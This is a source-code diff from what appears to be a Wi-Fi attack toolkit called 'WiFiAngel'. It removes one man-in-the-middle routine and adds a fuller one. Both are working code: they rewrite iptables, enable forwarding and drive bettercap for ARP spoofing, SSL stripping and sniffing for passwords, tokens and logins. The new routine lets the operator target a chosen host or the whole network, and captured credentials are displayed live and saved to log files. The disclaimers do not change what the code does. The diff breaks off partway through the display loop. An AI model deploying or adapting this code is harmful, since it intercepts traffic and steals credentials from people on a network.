-            mitm_log_dir.mkdir(parents=True, exist_ok=True)
-            
-            # Generate timestamp for the current session
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            session_dir = mitm_log_dir / timestamp
-            session_dir.mkdir(parents=True, exist_ok=True)
-            
-            # Create log files
-            bettercap_output = session_dir / "bettercap_output.log"
-            bettercap_traffic = session_dir / "network_traffic.log"
-            bettercap_passwords = session_dir / "passwords.log"
-            
-            # Store original system configuration for restoration
-            original_ip_forward = None
-            try:
-                with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
-                    original_ip_forward = f.read().strip()
-            except Exception as e:
-                self.console.print(f"[red]Warning: Could not read IP forwarding setting: {str(e)}[/]")
-            
-            # Backup iptables rules
-            original_iptables = subprocess.check_output(['iptables-save'], text=True)
-            
-            # Legal disclaimer and warning messages
-            self.console.print("\n[bold red]⚠️  LEGAL DISCLAIMER [/]")
-            self.console.print("[bold yellow]This tool is provided for educational and testing purposes ONLY.[/]")
-            self.console.print("[bold yellow]The developers take NO legal responsibility for misuse of this software.[/]")
-            self.console.print("[bold yellow]User is solely responsible for complying with applicable laws.[/]")
-            self.console.print("[bold yellow]Only use on networks you own or have explicit permission to test.[/]")
-            
-            self.console.print("\n[bold yellow]📣 Starting Man in the Middle Attack[/]")
-            self.console.print("[bold red]⚠️  WARNING: This attack intercepts network traffic![/]")
-            self.console.print("[bold red]⚠️  WARNING: Use only for testing on authorized networks![/]")
-            self.console.print("[bold cyan]ℹ️  Press [bold red]Ctrl+C[/] to stop the operation at any time.\n[/]")
-            
-            self.console.print(Panel("[bold green]Man in the Middle Attack[/]", border_style="green"))
-            
-            # Get the interface to use for the attack (current active interface)
-            attack_interface = self.interface_name
-            if attack_interface.endswith("mon"):
-                # Switch from monitor mode to managed mode
-                self.console.print("[yellow]Interface is in monitor mode. Switching to managed mode...[/]")
-                try:
-                    subprocess.run(["airmon-ng", "stop", attack_interface], 
-                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    
-                    # Find the new interface name
-                    interfaces = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode()
-                    for line in interfaces.split('\n'):
-                        if "Mode:Managed" in line:
-                            attack_interface = line.split()[0]
-                            break
-                    
-                    self.console.print(f"[green]Switched to managed mode: {attack_interface}[/]")
-                except Exception as e:
-                    self.console.print(f"[bold red]Error switching to managed mode: {str(e)}[/]")
-                    return
-            
-            # Get interface IP and gateway
-            try:
-                ip_info = subprocess.check_output(f"ip addr show {attack_interface} | grep 'inet ' | head -n 1", shell=True).decode()
-                gateway_info = subprocess.check_output(f"ip route | grep default | head -n 1", shell=True).decode()
-                
-                our_ip = re.search(r'inet\s+([0-9.]+)/', ip_info).group(1)
-                gateway = re.search(r'default via\s+([0-9.]+)', gateway_info).group(1)
-                
-                self.console.print(f"[bold green]Interface: {attack_interface} | IP: {our_ip} | Gateway: {gateway}[/]")
-            except Exception as e:
-                self.console.print(f"[bold red]Error getting network information: {str(e)}[/]")
-                self.console.print("[yellow]Make sure the interface is connected to a network[/]")
-                return
-            
-            # Enable IP forwarding (as requested)
-            self.console.print("[bold blue]Enabling IP forwarding...[/]")
-            subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
-            
-            # Set up iptables for traffic forwarding
-            self.console.print("[bold blue]Setting up traffic forwarding rules...[/]")
-            
-            # Clear existing rules
-            subprocess.run('iptables -F', shell=True)
-            subprocess.run('iptables -t nat -F', shell=True)
-            
-            # Set default policies
-            subprocess.run('iptables -P FORWARD ACCEPT', shell=True)
-            
-            # Enable NAT
-            subprocess.run(f'iptables -t nat -A POSTROUTING -o {attack_interface} -j MASQUERADE', shell=True)
-            
-            # Redirect HTTP traffic to BetterCAP - ONLY HTTP, not HTTPS as requested
-            subprocess.run('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080', shell=True)
-            
-            # Remove HTTPS redirection - we're not monitoring HTTPS traffic
-            # subprocess.run('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443', shell=True)
-            
-            # First ensure BetterCAP is not running
-            self.console.print("[bold blue]Stopping any running BetterCAP instances...[/]")
-            subprocess.run("killall -9 bettercap >/dev/null 2>&1", shell=True)
-            time.sleep(2)
-            
-            # Create BetterCAP configuration file with the exact requirements
-            bettercap_conf = session_dir / "bettercap.cap"
-            bettercap_conf_content = f"""
-# Network discovery
-net.probe on
-
-# Packet sniffing
-net.sniff on
-set net.sniff.local true
-set net.sniff.regexp .*password=.+
-set net.sniff.output {bettercap_passwords}
-
-# ARP spoofing
-arp.spoof on
-set arp.spoof.internal true
-set arp.spoof.fullduplex true
-
-# HTTP proxy
-http.proxy on
-set http.proxy.port 8080
-
-# HTTPS proxy disabled as requested
-https.proxy off
-"""
-            
-            # Write BetterCAP configuration
-            with open(bettercap_conf, 'w') as f:
-                f.write(bettercap_conf_content)
-            
-            # Start BetterCAP
-            self.console.print("[bold green]Starting BetterCAP with advanced capture capabilities...[/]")
-            self.console.print(f"[bold green]Log files directory: {session_dir}[/]")
-            self.console.print(f"[bold blue]Password matches will be saved to: {bettercap_passwords}[/]")
-            
-            bettercap_cmd = [
-                'bettercap', 
-                '-iface', attack_interface,
-                '-caplet', str(bettercap_conf)
-            ]
-            
-            # Start BetterCAP process with output redirection to file
-            bettercap_log = session_dir / "bettercap.log"
-            with open(bettercap_log, 'w+') as log_file:
-                bettercap_process = subprocess.Popen(
-                    bettercap_cmd,
-                    stdout=log_file,
-                    stderr=log_file,
-                    text=True,
-                    bufsize=1
-                )
-            
-            # Wait a moment for BetterCAP to start
-            time.sleep(3)
-            
-            # Check if process started properly
-            if bettercap_process.poll() is not None:
-                with open(bettercap_log, 'r') as log_file:
-                    stderr = log_file.read()
-                self.console.print(f"[bold red]Error starting BetterCAP: {stderr}[/]")
-                # Restore settings
-                self._restore_settings(original_ip_forward, original_iptables)
-                return
-            
-            # Show live status and activity
-            self.console.print("\n[bold green]Man in the Middle attack active![/]")
-            self.console.print("[bold green]Network discovery, ARP spoofing and traffic interception enabled[/]")
-            self.console.print(f"[bold blue]Capturing all traffic through {attack_interface}[/]")
-            self.console.print("[bold cyan]Actively searching for passwords in traffic[/]")
-            self.console.print("\n[bold yellow]Press Ctrl+C to stop the attack and restore settings[/]")
-            
-            # Keep running until user interrupts with Ctrl+C
-            start_time = time.time()
-            last_traffic_check = time.time()
-            traffic_stats = {
-                'bytes_total': 0,
-                'bytes_last': 0,
-                'packets_total': 0,
-                'packets_last': 0,
-                'clients': {},
-                'bandwidth': 0
-            }
-            try:
-                # Initialize display components
-                layout = Layout()
-                layout.split(
-                    Layout(name="header", size=3),
-                    Layout(name="disclaimer", size=2),
-                    Layout(name="main")
-                )
-                
-                # Split main area horizontally
-                main_layout = Layout()
-                layout["main"].update(main_layout)
-                main_layout.split_row(
-                    Layout(name="left_panel", ratio=2),
-                    Layout(name="right_panel", ratio=3)
-                )
-                
-                # Split left panel into metrics and clients
-                left_panel = Layout()
-                main_layout["left_panel"].update(left_panel)
-                left_panel.split(
-                    Layout(name="metrics", size=8),
-                    Layout(name="clients")
-                )
-                
-                # Split right panel into bettercap output and passwords
-                right_panel = Layout()
-                main_layout["right_panel"].update(right_panel)
-                right_panel.split(
-                    Layout(name="bettercap_output"),
-                    Layout(name="passwords", size=12)
-                )
-                
-                # Create Live display with initial layout
-                with Live(layout, refresh_per_second=1) as live:
-                    while True:
-                        # Update elapsed time
-                        elapsed = int(time.time() - start_time)
-                        hours, remainder = divmod(elapsed, 3600)
-                        minutes, seconds = divmod(remainder, 60)
-                        elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
-                        
-                        # Scan for clients every 5 seconds
-                        if time.time() - last_traffic_check > 5:
-                            try:
-                                # Get client list from ARP table
-                                arp_output = subprocess.check_output("arp -a", shell=True).decode()
-                                for line in arp_output.splitlines():
-                                    match = re.search(r'\((\d+\.\d+\.\d+\.\d+)\) at ([0-9a-f:]+)', line)
-                                    if match:
-                                        ip, mac = match.groups()
-                                        if mac != "00:00:00:00:00:00" and mac != "ff:ff:ff:ff:ff:ff":
-                                            if ip not in traffic_stats['clients']:
-                                                traffic_stats['clients'][ip] = {'mac': mac, 'bytes': 0, 'packets': 0}
-                                
-                                # Get traffic stats
-                                try:
-                                    # Use ifconfig to get traffic stats
-                                    ifconfig_output = subprocess.check_output(f"ifconfig {attack_interface}", shell=True).decode()
-                                    rx_match = re.search(r'RX packets (\d+).*?bytes (\d+)', ifconfig_output, re.DOTALL)
-                                    if rx_match:
-                                        packets_now = int(rx_match.group(1))
-                                        bytes_now = int(rx_match.group(2))
-                                        
-                                        # Calculate bandwidth
-                                        time_diff = time.time() - last_traffic_check
-                                        traffic_stats['packets_last'] = packets_now - traffic_stats['packets_total']
-                                        traffic_stats['bytes_last'] = bytes_now - traffic_stats['bytes_total']
-                                        traffic_stats['bandwidth'] = traffic_stats['bytes_last'] / time_diff
-                                        
-                                        # Update totals
-                                        traffic_stats['packets_total'] = packets_now
-                                        traffic_stats['bytes_total'] = bytes_now
-                                except:
-                                    pass
-                                
-                                last_traffic_check = time.time()
-                            except:
-                                pass
-                        
-                        # Header - Man in the Middle Attack title with Ctrl+C warning
-                        header = Panel(
-                            f"[bold red]Man in the Middle Attack Running[/] - [bold cyan]Elapsed: {elapsed_str}[/] - [bold red]Press Ctrl+C to stop[/]",
-                            border_style="red", 
-                            title="[bold white]MITM Monitor[/]",
-                            subtitle="[bold yellow]WiFiAngel[/]"
-                        )
-                        layout["header"].update(header)
-                        
-                        # Disclaimer panel
-                        disclaimer = Panel(
-                            "[bold yellow]EDUCATIONAL USE ONLY - NO LEGAL RESPONSIBILITY TAKEN - USE AT YOUR OWN RISK[/]",
-                            border_style="yellow",
-                            style="yellow"
-                        )
-                        layout["disclaimer"].update(disclaimer)
-                        
-                        # Read BetterCAP output from log file
-                        bettercap_output = []
-                        try:
-                            if os.path.exists(bettercap_log) and os.path.getsize(bettercap_log) > 0:
-                                with open(bettercap_log, 'r') as f:
-                                    lines = f.readlines()
-                                    # Use all lines from the log file instead of just 15
-                                    bettercap_output = [line.strip() for line in lines if line.strip()]
-                            
-                            if not bettercap_output:
-                                bettercap_output = ["BetterCAP is active, waiting for output..."]
-                        except Exception:
-                            bettercap_output = ["Error reading BetterCAP output"]
-                        
-                        # Read captured passwords
-                        passwords_found = []
-                        try:
-                            if os.path.exists(bettercap_passwords) and os.path.getsize(bettercap_passwords) > 0:
-                                with open(bettercap_passwords, 'r') as f:
-                                    lines = f.readlines()
-                                    for line in lines:
-                                        if "password" in line.lower():
-                                            passwords_found.append(line.strip())
-                        except Exception:
-                            passwords_found = ["Error reading password file"]
-                        
-                        # Format traffic metrics
-                        total_mb = traffic_stats['bytes_total'] / (1024 * 1024)
-                        bandwidth_kb = traffic_stats['bandwidth'] / 1024
-                        
-                        # Create metrics table
-                        metrics_table = Table(show_header=True, box=box.ROUNDED)
-                        metrics_table.add_column("Metric", style="cyan", no_wrap=True)
-                        metrics_table.add_column("Value", style="green")
-                        
-                        metrics_table.add_row("Interface", attack_interface)
-                        metrics_table.add_row("Uptime", elapsed_str)
-                        metrics_table.add_row("Total Traffic", f"{total_mb:.2f} MB")
-                        metrics_table.add_row("Bandwidth", f"{bandwidth_kb:.2f} KB/s")
-                        metrics_table.add_row("Packets", f"{traffic_stats['packets_total']}")
-                        metrics_table.add_row("Active Clients", f"{len(traffic_stats['clients'])}")
-                        
-                        metrics_panel = Panel(
-                            metrics_table,
-                            title="[bold blue]Network Metrics[/]",
-                            border_style="blue"
-                        )
-                        left_panel["metrics"].update(metrics_panel)
-                        
-                        # Create clients table
-                        clients_table = Table(show_header=True, box=box.ROUNDED)
-                        clients_table.add_column("IP", style="cyan")
-                        clients_table.add_column("MAC", style="green")
-                        
-                        # Add rows for each client
-                        for ip, data in list(traffic_stats['clients'].items())[:10]:  # Show top 10 clients
-                            clients_table.add_row(ip, data['mac'])
-                            
-                        # Show client count if more than 10 clients
-                        if len(traffic_stats['clients']) > 10:
-                            client_note = f"\n[yellow]+ {len(traffic_stats['clients']) - 10} more clients[/]"
-                        else:
-                            client_note = ""
-                            
-                        clients_panel = Panel(
-                            Group(clients_table, Text(client_note)),
-                            title=f"[bold green]Active Clients ({len(traffic_stats['clients'])})[/]",
-                            border_style="green"
-                        )
-                        left_panel["clients"].update(clients_panel)
-                        
-                        # BetterCAP output panel - Show full content without limitations
-                        bettercap_output_text = ""
-                        for line in bettercap_output:
-                            # Don't trim lines, show full content
-                            bettercap_output_text += line + "\n"
-                                
-                        # Use a built-in box style with less prominent borders
-                        simple_box = box.ROUNDED
-                        
-                        # Create panel with appropriate styling
-                        bettercap_panel = Panel(
-                            bettercap_output_text.rstrip(),
-                            title="[bold blue]BetterCAP Output[/]",
-                            border_style="blue",
-                            box=simple_box,
-                            padding=(0, 1)
-                        )
-                        right_panel["bettercap_output"].update(bettercap_panel)
-                        
-                        # Passwords panel
-                        if passwords_found:
-                            passwords_panel = Panel(
-                                "\n".join([f"[bold red]{p}[/]" for p in passwords_found[-10:]]),
-                                title=f"[bold red]Captured Passwords ({len(passwords_found)})[/]",
-                                border_style="red"
-                            )
-                        else:
-                            passwords_panel = Panel(
-                                "[yellow]Waiting for passwords to be captured...[/]",
-                                title="[bold red]Captured Passwords (0)[/]",
-                                border_style="red"
-                            )
-                        right_panel["passwords"].update(passwords_panel)
-                        
-                        # Force live display to refresh
-                        live.refresh()
-                        
-                        # Check if BetterCAP is still running
-                        if bettercap_process.poll() is not None:
-                            self.console.print("[bold red]BetterCAP process has terminated![/]")
-                            break
-                        
-                        # Sleep before next update
-                        time.sleep(1)
-            except KeyboardInterrupt:
-                self.console.print("\n[bold yellow]Stopping Man in the Middle Attack...[/]")
-            finally:
-                # Clean up and restore original settings
-                self._restore_settings(original_ip_forward, original_iptables, bettercap_process)
-                
-                # Display summary
-                self.console.print("\n[bold green]Man in the Middle Attack Summary[/]")
-                
-                # Check for captured passwords
-                if os.path.exists(bettercap_passwords) and os.path.getsize(bettercap_passwords) > 0:
-                    self.console.print(f"[bold red]!! PASSWORDS CAPTURED !![/]")
-                    self.console.print(f"[bold yellow]Check the log file: {bettercap_passwords}[/]")
-                    try:
-                        with open(bettercap_passwords, 'r') as f:
-                            password_data = f.read()
-                            password_table = Table(show_header=True, header_style="bold red")
-                            password_table.add_column("Captured Sensitive Data")
-                            
-                            # Only show the first 10 lines to avoid overwhelming output
-                            for line in password_data.splitlines()[:10]:
-                                password_table.add_row(line)
-                            
-                            self.console.print(password_table)
-                            
-                            if len(password_data.splitlines()) > 10:
-                                self.console.print(f"[yellow]... and {len(password_data.splitlines()) - 10} more entries[/]")
-                    except:
-                        self.console.print("[red]Error reading password file[/]")
-                else:
-                    self.console.print("[yellow]No passwords were captured during this session.[/]")
-                
-                # Display logs location
-                self.console.print(f"[green]Log files are saved in: {session_dir}[/]")
-                
-        except Exception as e:
-            self.console.print(f"[bold red]Error during Man in the Middle attack: {str(e)}[/]")
-            # Restore settings if needed
-            if 'original_ip_forward' in locals() and 'original_iptables' in locals():
-                self._restore_settings(original_ip_forward, original_iptables)
-    
     def _restore_settings(self, original_ip_forward, original_iptables, bettercap_process=None):
         """Helper to restore system settings after MITM attack"""
         self.console.print("[bold blue]Restoring system settings...[/]")
@@ -5513,6 +5347,18 @@ https.proxy off
                     self.console.print("[yellow]Firewall rules flushed[/]")
                 except:
                     self.console.print("[red]Failed to restore firewall rules[/]")
+
+    def _format_bytes(self, bytes_value):
+        """Convert bytes to human-readable format"""
+        bytes_value = float(bytes_value)
+        if bytes_value < 1024:
+            return f"{bytes_value:.0f} B"
+        elif bytes_value < 1024**2:
+            return f"{bytes_value/1024:.2f} KB"
+        elif bytes_value < 1024**3:
+            return f"{bytes_value/(1024**2):.2f} MB"
+        else:
+            return f"{bytes_value/(1024**3):.2f} GB"
 
     def get_mac(self, ip, interface):
         """Get MAC address of any device on the same network"""
@@ -5774,6 +5620,611 @@ https.proxy off
         except Exception as e:
             self.logger.error(f"Error verifying PMKID: {str(e)}")
             return False
+
+    def mitm_attack(self):
+            """Man in the Middle attack with ARP spoofing and packet capture"""
+            # Check if running as root
+            if os.geteuid() != 0:
+                self.console.print("[bold red]This attack requires root privileges![/]")
+                return
+                
+            # Verify requirements
+            if not shutil.which("bettercap"):
+                self.console.print("[bold red]bettercap is required for this attack![/]")
+                self.console.print("To install: sudo apt-get install bettercap")
+                return
+            
+            # ====== INFORMATION AND WARNING SECTION ======
+            self.console.clear()
+            warning_panel = Panel(
+                Group(
+                    Text("⚠️ Man-in-the-Middle Attack Warning ⚠️", justify="center"),
+                    Text(""),
+                    Text("- This attack intercepts network traffic between clients and the gateway"),
+                    Text("- All data passing through the network will be captured and analyzed"),
+                    Text("- Passwords and sensitive information may be exposed"),
+                    Text("- This tool should ONLY be used on networks you own or have permission to test"),
+                    Text("- Unauthorized use is illegal and may result in criminal prosecution"),
+                    Text(""),
+                    Text("DISCLAIMER: Use at your own risk. You are responsible for your actions.", justify="center"),
+                    Text(""),
+                    Text("Press ENTER to continue or CTRL+C to cancel", justify="center")
+                ),
+                title="[bold white]WiFiAngel - MITM Attack Module[/]",
+                border_style="yellow"
+            )
+            
+            self.console.print(warning_panel)
+            try:
+                input()  # Wait for ENTER to continue
+            except KeyboardInterrupt:
+                self.console.print("\n[bold yellow]Attack cancelled by user.[/]")
+                return
+            
+            # Get network interfaces with IP and Gateway
+            interfaces = {}
+            gateways = {}
+            
+            try:
+                # Get interfaces with valid IPs
+                for interface in netifaces.interfaces():
+                    # Skip loopback
+                    if interface == 'lo':
+                        continue
+                        
+                    # Get interface addresses
+                    addrs = netifaces.ifaddresses(interface)
+                    if netifaces.AF_INET in addrs:
+                        ip = addrs[netifaces.AF_INET][0]['addr']
+                        # Skip interfaces without valid IPs
+                        if ip.startswith('127.') or not re.match(r'\d+\.\d+\.\d+\.\d+', ip):
+                            continue
+                        interfaces[interface] = ip
+                
+                # Get default gateway
+                gateway_info = netifaces.gateways()
+                if 'default' in gateway_info and netifaces.AF_INET in gateway_info['default']:
+                    gw_info = gateway_info['default'][netifaces.AF_INET]
+                    gateways[gw_info[1]] = gw_info[0]  # interface: gateway_ip
+            except Exception as e:
+                self.console.print(f"[bold red]Error getting network information: {str(e)}[/]")
+                return
+                
+            # Let user choose network interface
+            self.console.clear()
+            
+            interface_panel = Panel(
+                Group(
+                    Text("Select Network Interface for Attack", justify="center"),
+                    Text(""),
+                    *(Text(f"[{i}] {iface} - IP: {ip} - Gateway: {gateways.get(iface, 'Unknown')}") 
+                      for i, (iface, ip) in enumerate(interfaces.items(), 1)),
+                    Text(""),
+                    Text("Enter the interface number or 0 to cancel:", justify="center")
+                ),
+                title="Available Network Interfaces",
+                border_style="blue"
+            )
+            
+            self.console.print(interface_panel)
+            
+            choice = Prompt.ask("Interface", choices=["0"] + [str(i) for i in range(1, len(interfaces) + 1)])
+            if choice == "0":
+                return
+                
+            selected_iface = list(interfaces.keys())[int(choice) - 1]
+            selected_ip = interfaces[selected_iface]
+            selected_gateway = gateways.get(selected_iface, None)
+            
+            if not selected_gateway:
+                self.console.print(f"[bold red]No gateway found for interface {selected_iface}![/]")
+                return
+            
+            # Scan local network to find targets
+            self.console.print("[bold cyan]Scanning network for available targets...[/]")
+            
+            # Simple network scan using ping sweep
+            network_prefix = ".".join(selected_ip.split(".")[:3]) + "."
+            online_hosts = {}
+            
+            with Progress() as progress:
+                scan_task = progress.add_task("[cyan]Scanning network...", total=254)
+                
+                for i in range(1, 255):
+                    progress.update(scan_task, advance=1)
+                    ip = f"{network_prefix}{i}"
+                    
+                    # Skip our IP
+                    if ip == selected_ip:
+                        continue
+                        
+                    # Try to ping the host
+                    try:
+                        result = subprocess.run(
+                            ["ping", "-c", "1", "-W", "0.2", ip],
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            timeout=0.5
+                        )
+                        if result.returncode == 0:
+                            # Try to get hostname
+                            try:
+                                hostname = socket.gethostbyaddr(ip)[0]
+                            except:
+                                hostname = "Unknown"
+                                
+                            # Try to get MAC
+                            try:
+                                mac = self.get_mac(ip, selected_iface)
+                            except:
+                                mac = "Unknown"
+                                
+                            online_hosts[ip] = {"hostname": hostname, "mac": mac}
+                    except:
+                        pass
+            
+            # Present target selection options
+            target_panel = Panel(
+                Group(
+                    Text("Select Target for MITM Attack", justify="center"),
+                    Text(""),
+                    Text("[1] All network traffic (entire network)"),
+                    *(Text(f"[{i+2}] {ip} - {info['hostname']} ({info['mac']})") 
+                      for i, (ip, info) in enumerate(online_hosts.items())),
+                    Text(""),
+                    Text("Enter target number or 0 to cancel:", justify="center")
+                ),
+                title="[bold white]Available Targets[/]",
+                border_style="green"
+            )
+            
+            self.console.print(target_panel)
+            
+            target_choices = ["0", "1"] + [str(i) for i in range(2, len(online_hosts) + 2)]
+            target_choice = Prompt.ask("Target", choices=target_choices)
+            
+            if target_choice == "0":
+                return
+                
+            if target_choice == "1":
+                # Target entire network
+                target_ip = ""
+                target_desc = "Entire Network"
+            else:
+                # Target specific host
+                target_ip = list(online_hosts.keys())[int(target_choice) - 2]
+                target_desc = f"{target_ip} - {online_hosts[target_ip]['hostname']}"
+            
+            # Final confirmation
+            confirm_panel = Panel(
+                Group(
+                    Text("Ready to Start MITM Attack", justify="center"),
+                    Text(""),
+                    Text(f"Interface: {selected_iface}"),
+                    Text(f"Local IP:  {selected_ip}"),
+                    Text(f"Gateway:   {selected_gateway}"),
+                    Text(f"Target:    {target_desc}"),
+                    Text(""),
+                    Text("This attack will intercept network traffic."),
+                    Text("Press ENTER to start or CTRL+C to cancel", justify="center")
+                ),
+                title="[bold white]Attack Confirmation[/]",
+                border_style="yellow"
+            )
+            
+            self.console.print(confirm_panel)
+            
+            try:
+                input()  # Wait for ENTER to continue
+            except KeyboardInterrupt:
+                self.console.print("\n[bold yellow]Attack cancelled by user.[/]")
+                return
+            
+            # Set up logs directory
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            log_dir = Path(f"logs/mitm/{timestamp}")
+            log_dir.mkdir(parents=True, exist_ok=True)
+            
+            # Log files
+            password_log = log_dir / "passwords.txt"
+            traffic_log = log_dir / "traffic.txt"
+            http_log = log_dir / "http.log"
+            dns_log = log_dir / "dns.log"
+            sensitive_log = log_dir / "sensitive_data.log"
+            
+            # Create bettercap script
+            bettercap_script = log_dir / "bettercap.cap"
+            bettercap_options = f"""set net.sniff.verbose true
+set net.sniff.local true
+set net.sniff.filter tcp
+net.sniff on
+set http.proxy.sslstrip true
+any.proxy on
+https.proxy on
+set net.sniff.patterns password,login,passwd,auth,secret,token,user,admin
+events.stream on
+set events.stream.output {log_dir}/events.log
+set http.proxy.http_log {http_log}
+set http.proxy.password_log {password_log}
+set dns.spoof.all false
+net.recon on
+arp.spoof on"""
+    
+            # Add target if specific host
+            if target_ip:
+                bettercap_options += f"\n\nset arp.spoof.targets {target_ip}"
+            
+            with open(bettercap_script, "w") as f:
+                f.write(bettercap_options)
+            
+            # Create sensitive data log file
+            with open(sensitive_log, "w") as f:
+                f.write(f"# Sensitive data log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"# Monitoring for patterns: password,login,passwd,auth,secret,token,user,admin\n\n")
+            
+            # Enable IP forwarding and set up iptables
+            self.console.print(f"\n[bold green]Man in the Middle Attack Setup[/]")
+            self.console.print(f"[bold cyan]Preparing attack on {target_desc} via {selected_iface}...[/]")
+            
+            # Save original settings
+            original_ip_forward = None
+            original_iptables = []
+            
+            try:
+                # Read original IP forwarding setting
+                with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
+                    original_ip_forward = f.read().strip()
+                    
+                # Get original iptables rules
+                result = subprocess.run(["iptables", "-t", "nat", "-S"], capture_output=True, text=True)
+                original_iptables = result.stdout
+                
+                # Enable IP forwarding
+                self.console.print("[bold blue]Enabling IP forwarding...[/]")
+                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
+                
+                # Set up traffic forwarding rules
+                self.console.print("[bold blue]Setting up traffic forwarding rules...[/]")
+                subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", selected_iface, "-j", "MASQUERADE"], stdout=subprocess.DEVNULL)
+                
+                # Stop any running BetterCAP instances
+                self.console.print("[bold blue]Stopping any running BetterCAP instances...[/]")
+                subprocess.run(["pkill", "-f", "bettercap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                # Create traffic log file
+                with open(traffic_log, "w") as f:
+                    f.write(f"# Traffic log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write(f"# Interface: {selected_iface}, IP: {selected_ip}, Gateway: {selected_gateway}\n\n")
+                
+                # Create password log file if it doesn't exist
+                if not password_log.exists():
+                    with open(password_log, "w") as f:
+                        f.write(f"# Password log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+                
+                # Start bettercap with our script
+                self.console.print("[bold green]Starting BetterCAP and preparing attack environment...[/]")
+                
+                # Create files for BetterCAP output
+                bettercap_stdout_file = open(os.path.join(log_dir, "bettercap_stdout.log"), "w")
+                bettercap_stderr_file = open(os.path.join(log_dir, "bettercap_stderr.log"), "w")
+                
+                # Start BetterCAP process
+                bettercap_cmd = f"bettercap -iface {selected_iface} -caplet {bettercap_script}"
+                bettercap_process = subprocess.Popen(
+                    bettercap_cmd.split(),
+                    stdout=bettercap_stdout_file,
+                    stderr=bettercap_stderr_file,
+                    universal_newlines=True
+                )
+                
+                # Give BetterCAP time to initialize
+                time.sleep(3)
+                
+                # Check if process is still running
+                if bettercap_process.poll() is not None:
+                    # BetterCAP exited early
+                    self.console.print("[bold red]BetterCAP failed to start! Please check log files.[/]")
+                    if 'bettercap_stdout_file' in locals() and not bettercap_stdout_file.closed:
+                        bettercap_stdout_file.close()
+                    if 'bettercap_stderr_file' in locals() and not bettercap_stderr_file.closed:
+                        bettercap_stderr_file.close()
+                    self._restore_settings(original_ip_forward, original_iptables)
+                    return
+                
+                self.console.print("\n[bold white on red]!!! IMPORTANT: Press Ctrl+C to stop the attack when finished !!![/]")
+                
+                # Create rich layout for visual display
+                layout = Layout(name="root")
+                
+                # Main sections
+                layout.split(
+                    Layout(name="header", size=3),
+                    Layout(name="body"),
+                    Layout(name="footer", size=3)
+                )
+                
+                # Body sections - adjust ratio between left and right columns
+                layout["body"].split_row(
+                    Layout(name="left_column", ratio=4),  # More space for left column
+                    Layout(name="right_column", ratio=1)  # Narrow the right column
+                )
+                
+                # Left column sections - adjust ratios between Traffic section and Sensitive Data
+                layout["left_column"].split(
+                    Layout(name="status", ratio=1),
+                    Layout(name="network_traffic", ratio=4),  # More space for Network Traffic
+                    Layout(name="sensitive_data", ratio=2)
+                )
+                
+                # Right column sections - more space for clients
+                layout["right_column"].split(
+                    Layout(name="stats", ratio=1),
+                    Layout(name="clients", ratio=3)  # More space for Client table
+                )
+                
+                # Stats for display
+                attack_stats = {
+                    'start_time': time.time(),
+                    'packets': 0,
+                    'bytes': 0,
+                    'clients': {},
+                    'last_traffic': [],
+                    'sensitive_matches': []
+                }
+                
+                # Function to update traffic log with latest data
+                def update_traffic_log(data):
+                    try:
+                        with open(traffic_log, "a") as f:
+                            f.write(f"{datetime.now().strftime('%H:%M:%S')} - {data}\n")
+                    except:
+                        pass
+                
+                # Function to update sensitive data log
+                def update_sensitive_log(data):
+                    try:
+                        with open(sensitive_log, "a") as f:
+                            f.write(f"{datetime.now().strftime('%H:%M:%S')} - {data}\n")
+                    except:
+                        pass
+                
+                # Live display loop
+                with Live(layout, refresh_per_second=2, screen=True) as live:
+                    try:
+                        while True:
+                            # Check if BetterCAP process is still running
+                            if bettercap_process.poll() is not None:
+                                layout["body"].update(Panel("[bold red]BetterCAP unexpectedly stopped! Attack terminated.[/]"))
+                                live.refresh()
+                                time.sleep(2)
+                                break
+                            
+                            # Calculate elapsed time
+                            elapsed = time.time() - attack_stats['start_time']
+                            hours, remainder = divmod(elapsed, 3600)
+                            minutes, seconds = divmod(remainder, 60)
+                            elapsed_str = f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
+                            
+                            # Update traffic statistics
+                            try:
+                                # Get interface statistics
+                                ifconfig_output = subprocess.check_output(f"ifconfig {selected_iface}", shell=True).decode()
+                                rx_match = re.search(r'RX packets (\d+).*?bytes (\d+)', ifconfig_output, re.DOTALL)
+                                if rx_match:
+                                    attack_stats['packets'] = int(rx_match.group(1))
+                                    attack_stats['bytes'] = int(rx_match.group(2))
+                                    
+                                # Get client list from ARP table
+                                arp_output = subprocess.check_output("arp -a", shell=True).decode()
+                                for line in arp_output.splitlines():
+                                    match = re.search(r'\((\d+\.\d+\.\d+\.\d+)\) at ([0-9a-f:]+)', line)
+                                    if match:
+                                        ip, mac = match.groups()
+                                        if mac != "00:00:00:00:00:00" and mac != "ff:ff:ff:ff:ff:ff":
+                                            if ip not in attack_stats['clients']:
+                                                hostname = "Unknown"
+                                                try:
+                                                    hostname = socket.gethostbyaddr(ip)[0]
+                                                except:
+                                                    pass
+                                                attack_stats['clients'][ip] = {
+                                                    'mac': mac, 
+                                                    'first_seen': datetime.now(),
+                                                    'hostname': hostname
+                                                }
+                                                update_traffic_log(f"New client detected: {ip} ({mac}) - {hostname}")
+                                
+                                # Read BetterCAP events for sensitive data patterns
+                                patterns = ["password", "login", "passwd", "auth", "secret", "token", "user", "admin"]
+                                
+                                # Check for sensitive data in BetterCAP output
+                                try:
+                                    with open(os.path.join(log_dir, "bettercap_stdout.log"), 'r') as f:
+                                        lines = f.readlines()
+                                        if lines:
